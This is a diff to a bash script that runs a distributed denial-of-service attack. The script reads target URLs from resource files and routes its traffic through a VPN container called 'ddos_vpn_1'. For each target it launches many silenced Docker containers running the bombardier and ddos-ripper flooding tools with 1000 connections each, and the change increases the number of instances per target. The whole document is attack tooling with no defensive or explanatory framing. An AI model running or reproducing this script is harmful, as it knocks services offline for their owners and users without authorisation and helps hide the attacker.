@@ -22,22 +22,29 @@ echo "VPN started."
 
 echo "Starting Bombardier instances..."
 IFS=$'\n' read -d '' -r -a linesbomb < $RESOURCES_FILE_BOMB
-for URL in "${linesbomb[@]}"
+for BOMB in "${linesbomb[@]}"
 do
-   echo "Starting for $URL"
-   {
-     sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $URL 
-   } &> /dev/null
+   echo "Starting for $BOMB"
+   for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
+   do
+      {
+         sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 alpine/bombardier -c 1000 -d 540s -l $BOMB 
+      } &> /dev/null
+   done
 done
 echo "Bombardier instances started."
 
+
 echo "Starting Ripper instances..."
 IFS=$'\n' read -d '' -r -a linesripper < $RESOURCES_FILE_RIPPER
-for URL in "${linesripper[@]}"
+for RIP in "${linesripper[@]}"
 do
-   echo "Starting for $URL"
-   {
-     sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $URL 
-   } &> /dev/null
+   echo "Starting for $RIP"
+   for (( c=1; c<=$INSTANCE_PER_RIPPER; c++ ))
+   do
+      {
+         sudo docker run -d -m 128m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $RIP
+      } &> /dev/null
+   done
 done
 echo "Ripper instances started."
